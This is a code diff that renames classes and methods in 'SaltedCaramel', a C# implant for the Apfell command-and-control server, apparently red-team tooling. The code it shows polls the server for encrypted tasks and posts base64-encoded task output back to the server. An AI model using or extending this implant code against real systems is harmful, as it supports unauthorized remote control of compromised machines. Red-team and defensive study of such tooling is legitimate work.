@@ -12,12 +12,12 @@ namespace SaltedCaramel
     /// Struct for formatting task output or other information to send back
     /// to Apfell server
     /// </summary>
-    internal struct TaskResponse
+    internal struct SCTaskResp
     {
         public string response;
         public string id;
 
-        public TaskResponse(string response, string id)
+        public SCTaskResp(string response, string id)
         {
             this.response = System.Convert.ToBase64String(Encoding.UTF8.GetBytes(response));
             this.id = id;
@@ -46,7 +46,7 @@ namespace SaltedCaramel
     /// <summary>
     /// This class contains all methods used by the CaramelImplant
     /// </summary>
-    internal class SaltedCaramelImplant
+    internal class SCImplant
     {
         internal string callbackId { get; set; }
         internal string endpoint { get; set; }
@@ -61,14 +61,14 @@ namespace SaltedCaramel
         public string architecture { get; set; }
         private int retry { get; set; }
         internal byte[] PSK { get; set; }
-        internal SaltedCaramelCrypto crypto = new SaltedCaramelCrypto();
+        internal SCCrypto crypto = new SCCrypto();
 
         /// <summary>
         /// Post a response to the Apfell endpoint
         /// </summary>
         /// <param name="taskresp">The response to post to the endpoint</param>
         /// <returns>String with the Apfell server's reply</returns>
-        public string PostResponse(TaskResponse taskresp)
+        public string SCPostResp(SCTaskResp taskresp)
         {
             string endpoint = this.endpoint + "responses/" + taskresp.id;
             try // Try block for HTTP requests
@@ -88,7 +88,7 @@ namespace SaltedCaramel
                     {
                         Debug.WriteLine($"[!] PostResponse - ERROR: Unable to post task response for {taskresp.id}, retrying...");
                         Thread.Sleep(this.sleep);
-                        this.PostResponse(taskresp);
+                        this.SCPostResp(taskresp);
                     }
                     retry++;
                     throw (new Exception("[!] PostResponse - ERROR: Retries exceeded"));
@@ -104,15 +104,15 @@ namespace SaltedCaramel
         public void SendComplete(string taskId)
         {
             Debug.WriteLine($"[+] SendComplete - Sending task complete for {taskId}");
-            TaskResponse completeResponse = new TaskResponse("{\"completed\": true}", taskId);
-            this.PostResponse(completeResponse);
+            SCTaskResp completeResponse = new SCTaskResp("{\"completed\": true}", taskId);
+            this.SCPostResp(completeResponse);
         }
 
         public void SendError(string taskId, string error)
         {
             Debug.WriteLine($"[+] SendError - Sending error for {taskId}: {error}");
-            TaskResponse errorResponse = new TaskResponse("{\"completed\": true, \"status\": \"error\", \"user_output\": \"" + error + "\"}", taskId);
-            this.PostResponse(errorResponse);
+            SCTaskResp errorResponse = new SCTaskResp("{\"completed\": true, \"status\": \"error\", \"user_output\": \"" + error + "\"}", taskId);
+            this.SCPostResp(errorResponse);
         }
 
         /// <summary>
@@ -172,7 +172,7 @@ namespace SaltedCaramel
         /// Check Apfell endpoint for new task
         /// </summary>
         /// <returns>CaramelTask with the next task to execute</returns>
-        public SaltedCaramelTask CheckTasking()
+        public SCTask CheckTasking()
         {
             string taskEndpoint = this.endpoint + "tasks/callback/" + this.callbackId + "/nextTask";
             try // Try block for checking tasks (throws if retries exceeded)
@@ -181,7 +181,7 @@ namespace SaltedCaramel
                 {
                     try // Try block for HTTP request
                     {
-                        SaltedCaramelTask task = JsonConvert.DeserializeObject<SaltedCaramelTask>(crypto.Decrypt(HTTP.Get(taskEndpoint)));
+                        SCTask task = JsonConvert.DeserializeObject<SCTask>(crypto.Decrypt(HTTP.Get(taskEndpoint)));
                         retry = 0;
                         if (task.command != "none")
                             Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
